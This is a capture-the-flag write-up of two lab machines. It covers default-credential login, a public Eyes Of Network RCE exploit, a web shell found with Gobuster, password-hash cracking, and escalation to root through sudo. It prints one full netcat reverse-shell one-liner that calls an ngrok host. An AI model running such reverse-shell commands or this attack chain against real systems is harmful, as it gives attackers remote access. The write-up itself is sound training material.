In this challenge, we are tasked to become root of the machine. First we go to the login page and can log-in with the credentials `admin:admin` (before that other teams changed it).
![[raeliste1_login.png]]

There is nothing that looks interesting on this website so can search for online available exploits for `Eyes Of Netwok exploit` One common website that list exploits is Exploit-DB:

![[realiste1_exploit.png]]

We can also locally find exploit using the `searchsploit` tool:
![[realiste1_searchsploit.png]]




After a bit of digging, I found this exploit [https://github.com/h4knet/eonrce](https://github.com/h4knet/eonrce). For this to work, I only need to specify the website, my IP (here my `ngrok`) and my port. To do so, I launched my listener and my ngrok:

![[realiste1_listener.png]]

Now I just have to run the exploit:

![[realiste1_final_exploit.png]]
When heading back to our listener, we have a root shell and we can now improve it :

![[realiste1_root_shell.png.png]]

We can now read the flag at `/root/flag.txt`

# PwnMe

In this challenge, we are also tasked to become root of the machine. 

First, we can enumerate the website using `Gobuster` because there is nothing in the source code or on the page:

![[realiste2_gobuster.png]]

As you can see, there are a lot of results. Lets look at the `assets` folder:
![[realiste2_assets.png.png]]


We notice a file called `shell.php`:

![[realiste2_shell.png]]

As you can see, we can perform basic Linux command execution, lets try to execute a reverse shell command (and not be loud like the other teams uploading a lot of files):
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 4.tcp.eu.ngrok.io 14433 >/tmp/f`

We now have a shell as `www-data`, this user by default don't have rights but as you can see, we can read the content of `/home/debian/.htpasswd`:

![[realiste2_passwd.png]]
This gives us the md5 hash of the user `debian` that we can crack offline using `John` or `Hashcat` but also online using `crackstation`:  

![[realiste2_md5.png]]

We now have the password of the user `debian`. We can run `su debian` and provide the found password:

![[realiste_debian.png]]

As we can see, we can run any commands as `debian`:

![[realiste_sudo_l.png]]

So we can get a root shell as follows:

![[realiste_sudo.png]]

And now we juste have to go to the `/root` folder and recover the flag:
